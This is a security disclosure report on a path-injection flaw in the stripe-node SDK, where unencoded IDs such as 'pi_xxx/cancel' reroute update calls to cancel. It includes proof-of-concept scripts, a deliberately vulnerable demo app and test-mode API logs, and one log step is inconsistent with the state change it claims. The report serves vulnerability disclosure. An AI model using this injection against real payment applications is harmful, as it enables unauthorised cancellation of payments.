# Vulnerability 1: Unencoded Path Parameter Injection in Generated Resource Methods
 
---
 
## A. Summary
 
An attacker-controlled Stripe object ID passed into generated SDK resource methods (e.g., `stripe.paymentIntents.update(id, ...)`) is not URL-encoded before being interpolated into the request path, allowing it to escape its intended path segment and invoke **different** Stripe API endpoints.
 
---
 
Because the SDK directly concatenates the `id` into paths like:
 
```
/v1/payment_intents/${id}
```
 
an attacker can supply values such as:
 
```
pi_123/cancel
```
 
which transforms the intended request:
 
```
POST /v1/payment_intents/pi_123
```
 
into:
 
```
POST /v1/payment_intents/pi_123/cancel
```
 
This results in **endpoint confusion**, where a method intended to perform a safe update operation is instead routed to a state-changing endpoint (e.g., `cancel`, `capture`, `confirm`).
 
---
 
## Validation Bypass
 
Importantly, this behavior can bypass common application-level validation patterns such as:
 
```js
id.startsWith('pi_')
```
 
because injected values like `pi_123/cancel` **still satisfy the validation check** while silently altering the request semantics.
 
---
 
## Impact
 
Using Stripe's real test API, this issue was demonstrated to:
 
- Successfully route an `update` call to the `cancel` endpoint
- Trigger Stripe's cancel-specific error responses
- Change the PaymentIntent status from `requires_payment_method` to `canceled`
This confirms that attacker-controlled input can lead to **unintended financial state changes** on Stripe objects.
 
---
 
## Security Implication
 
This is not just a formatting issue — it is a **business logic vulnerability at the SDK layer**, where:
 
- Developers rely on method-level guarantees (e.g., *"this function updates a PaymentIntent"*)
- The SDK silently allows those guarantees to be broken via unencoded path parameters
As a result, applications that expose Stripe operations with partially trusted input may unknowingly allow attackers to:
 
- Cancel payments
- Trigger unintended lifecycle transitions
- Access or invoke subresource endpoints
**without explicitly calling those APIs.**
 
---
 
## B. Why It Is Exploitable
 
Generated methods splice IDs directly into template strings:
 
- **`PaymentIntents.ts` ** uses:
  ```ts
  /v1/payment_intents/${id}
  ```
- **`StripeResource._makeRequest`** forwards that path unchanged into the HTTP request at `StripeResource.ts` (line 124).
- The repo already has a URL interpolation helper that encodes path variables with `encodeURIComponent` in **`utils.ts` (line 143)**, but these generated methods **do not use it**.
---
 
## C. Real-World Impact
 
If an app exposes a "safe" operation like `stripe.paymentIntents.update(id, body)` and the attacker controls `id`, they can pass `pi_xxx/cancel` and turn it into:
 
```
POST /v1/payment_intents/pi_xxx/cancel
```
 
Stripe docs define `update` and `cancel` as **separate endpoints**:
- [Update PaymentIntent](https://docs.stripe.com/api/payment_intents/update)
- [Cancel PaymentIntent](https://docs.stripe.com/api/payment_intents/cancel)
This can cause:
- Unintended payment cancellation
- Capture/confirm endpoint access
- Subresource data exposure depending on the method
---
 
## D. Step-by-Step Reproduction
 
### Step 1 — Build Locally Without Changing Source
 
```bash
cd <dir>
yarn install --frozen-lockfile
./node_modules/.bin/tsc -p tsconfig.cjs.json
```
 
### Step 2 — Run a Local Mock Stripe API and Observe the Path
 
```bash
node <<'NODE'
const http = require('http');
const Stripe = require('./cjs/stripe.cjs.node.js');
 
const server = http.createServer((req, res) => {
  console.log(`${req.method} ${req.url}`);
  res.writeHead(200, {'content-type': 'application/json', 'request-id': 'req_test'});
  res.end(JSON.stringify({id: 'ok', object: 'payment_intent'}));
});
 
server.listen(4242, async () => {
  const stripe = Stripe('sk_test_dummy', {
    host: '127.0.0.1',
    port: 4242,
    protocol: 'http',
    maxNetworkRetries: 0,
  });
 
  await stripe.paymentIntents.update('pi_attacker/cancel', {
    cancellation_reason: 'abandoned',
  });
 
  server.close();
});
NODE
```
 
**Expected verification — the mock server prints:**
 
```
POST /v1/payment_intents/pi_attacker/cancel
```
 
That proves the `id` became path syntax instead of remaining a single encoded ID segment.
 
---
 
## E. Exploit Chain Possibility
 
This chains well with weak app-side checks such as `id.startsWith("pi_")`, because `pi_xxx/cancel` still passes. If the app passes request JSON directly into SDK params, the attacker can choose parameters accepted by the unintended endpoint.
 
### Prerequisites — Make Sure `cjs/` Exists
 
```bash
yarn install --frozen-lockfile
./node_modules/.bin/tsc -p tsconfig.cjs.json
```
 
### Single-Command End-to-End PoC (Run from Repo Root)
 
```bash
node <<'NODE'
const http = require('http');
const Stripe = require('./cjs/stripe.cjs.node.js');
 
const stripeMock = http.createServer((req, res) => {
  console.log('[Stripe API received]', req.method, req.url);
  res.writeHead(200, {'content-type': 'application/json', 'request-id': 'req_test'});
  res.end(JSON.stringify({id: 'ok', object: 'payment_intent'}));
});
 
stripeMock.listen(4242, () => {
  const stripe = Stripe('sk_test_dummy', {
    host: '127.0.0.1',
    port: 4242,
    protocol: 'http',
    maxNetworkRetries: 0,
  });
 
  const vulnerableApp = http.createServer(async (req, res) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      const input = JSON.parse(body);
 
      // Common but weak application-side guard:
      // "Only allow PaymentIntent IDs"
      if (!input.id.startsWith('pi_')) {
        res.writeHead(400);
        return res.end('blocked');
      }
 
      console.log('[App check passed]', input.id);
 
      await stripe.paymentIntents.update(input.id, {
        cancellation_reason: input.cancellation_reason,
      });
 
      res.writeHead(200);
      res.end('ok');
 
      vulnerableApp.close();
      stripeMock.close();
    });
  });
 
  vulnerableApp.listen(8080, async () => {
    await fetch('http://127.0.0.1:8080/update-payment-intent', {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({
        id: 'pi_attacker/cancel',
        cancellation_reason: 'abandoned'
      })
    });
  });
});
NODE
```
 
### Output
 
```
[App check passed] pi_attacker/cancel
[Stripe API received] POST /v1/payment_intents/pi_attacker/cancel
```
 
### That Proves the Chain
 
1. App intended to allow only PaymentIntent update.
2. App's `id.startsWith("pi_")` validation passed.
3. The SDK converted the attacker's `id` into a different route.
4. Stripe receives `POST /v1/payment_intents/:id/cancel`, not the intended update route.


### Live API Test Evidence: Unencoded Path Parameter Injection:

> **Test Mode Only** — All testing was performed exclusively against Stripe's test API. No live payment data was touched at any point.
 
---
 
## Step 1 — Set Stripe Test Secret Key
 
```bash
export STRIPE_TEST_SECRET_KEY='sk_test_key'
```
 
I confirmed the key was a test key because it started with:
 
```
sk_test_
```
 
---
 
## Step 2 — Create a Disposable PaymentIntent
 
```bash
curl -sS https://api.stripe.com/v1/payment_intents \
  -u "$STRIPE_TEST_SECRET_KEY:" \
  -d amount=1000 \
  -d currency=usd \
  -d "metadata[poc]"="stripe-node-path-injection" \
  -d "metadata[disposable]"="true"
```
 
Stripe returned this test PaymentIntent:
 
```
pi_3TQHMdFi97flIn7U03C3eOyN
```
 
I verified it was safe test-mode data:
 
```json
{
  "id": "pi_3TQHMdFi97flIn7U03C3eOyN",
  "status": "requires_payment_method",
  "livemode": false
}
```
 
> **The important part:** `livemode: false` — this confirms I was **not** touching live payment data.
 
---
 
## Step 3 — Trigger the Injection via the SDK
 
I called the SDK method that is supposed to **update** a PaymentIntent:
 
```js
await stripe.paymentIntents.update(id, {
  cancellation_reason: 'abandoned',
});
```
 
But I controlled the `id` value and set it to:
 
```
pi_3TQHMdFi97flIn7U03C3eOyN/cancel
```
 
---
 
## Step 4 — Observe the Injected Request
 
So instead of the SDK sending the **intended** request:
 
```
POST /v1/payment_intents/pi_3TQHMdFi97flIn7U03C3eOyN
```
 
It sent this request:
 
```
POST /v1/payment_intents/pi_3TQHMdFi97flIn7U03C3eOyN/cancel
```
 
That is Stripe's **cancel** endpoint — not the update endpoint.
 
---
 
## Step 5 — Stripe's Response Confirms Endpoint Hit
 
Stripe returned this error:
 
```
You cannot cancel this PaymentIntent because it has a status of canceled.
```
 
> This error **confirms** the cancel endpoint was reached. The normal update endpoint would never return a "cannot cancel" error.
 
---
 
## Step 6 — Retrieve PaymentIntent and Confirm State Change
 
Finally, I retrieved the PaymentIntent again and confirmed the status had changed:
 
```json
{
  "id": "pi_3TQHMdFi97flIn7U03C3eOyN",
  "status": "canceled",
  "livemode": false
}
```
 
---
 
## Conclusion
 
This live test proves that when an attacker-controlled ID containing `/cancel` is passed into `stripe.paymentIntents.update()`:
 
1. The SDK does **not** URL-encode the ID.
2. The `/cancel` suffix escapes the intended path segment.
3. The request is silently routed to Stripe's **cancel** endpoint instead of the **update** endpoint.
4. The PaymentIntent status changed from `requires_payment_method` to `canceled` — confirming real, unintended state mutation on a Stripe object.

### My terminal output:
```bash
[keshavgoyal@hazelnut stripe-node]$ export STRIPE_TEST_SECRET_KEY='sk_test_key'


[keshavgoyal@hazelnut stripe-node]$ case "$STRIPE_TEST_SECRET_KEY" in
  sk_test_*) echo "Using test key";;
  *) echo "STOP: this is not a test secret key";;
esac
Using test key


[keshavgoyal@hazelnut stripe-node]$ CREATE_RESPONSE=$(curl -sS https://api.stripe.com/v1/payment_intents \
  -u "$STRIPE_TEST_SECRET_KEY:" \
  -d amount=1000 \
  -d currency=usd \
  -d "metadata[poc]"="stripe-node-path-injection" \
  -d "metadata[disposable]"="true")


[keshavgoyal@hazelnut stripe-node]$ PI_ID=$(printf '%s' "$CREATE_RESPONSE" | node -e "
let s='';
process.stdin.on('data', d => s += d);
process.stdin.on('end', () => {
  const o = JSON.parse(s);
  if (o.error) {
    console.error(o.error.message);
    process.exit(1);
  }
  console.log(o.id);
});
")
echo "$PI_ID"
pi_3TQHMdFi97flIn7U03C3eOyN



[keshavgoyal@hazelnut stripe-node]$ curl -sS "https://api.stripe.com/v1/payment_intents/$PI_ID" \
  -u "$STRIPE_TEST_SECRET_KEY:" \
| node -e "
let s='';
process.stdin.on('data', d => s += d);
process.stdin.on('end', () => {
  const o = JSON.parse(s);
  console.log({id: o.id, status: o.status, livemode: o.livemode});
});
"
{
  id: 'pi_3TQHMdFi97flIn7U03C3eOyN',
  status: 'requires_payment_method',
  livemode: false
}

[keshavgoyal@hazelnut stripe-node]$ node <<'NODE'
const Stripe = require('./cjs/stripe.cjs.node.js');

const stripe = Stripe(process.env.STRIPE_TEST_SECRET_KEY, {
  maxNetworkRetries: 0,
});

(async () => {
  const id = process.env.PI_ID + '/cancel';

  try {
    await stripe.paymentIntents.update(id, {
      cancellation_reason: 'abandoned',
    });
  } catch (e) {
    console.log('statusCode:', e.statusCode);
    console.log('type:', e.type);
    console.log('message:', e.message);
    console.log('requestId:', e.requestId);
  }
})();
NODE
statusCode: 400
type: StripeInvalidRequestError
message: You cannot cancel this PaymentIntent because it has a status of canceled. Only a PaymentIntent with one of the following statuses may be canceled: requires_payment_method, requires_capture, requires_reauthorization, requires_confirmation, requires_action, processing.
requestId: req_SRE4uu78URHMk7



[keshavgoyal@hazelnut stripe-node]$ curl -sS "https://api.stripe.com/v1/payment_intents/$PI_ID" \
  -u "$STRIPE_TEST_SECRET_KEY:" \
| node -e "
let s='';
process.stdin.on('data', d => s += d);
process.stdin.on('end', () => {
  const o = JSON.parse(s);
  console.log({id: o.id, status: o.status, livemode: o.livemode});
});
"
{
  id: 'pi_3TQHMdFi97flIn7U03C3eOyN',
  status: 'canceled',
  livemode: false
}


```
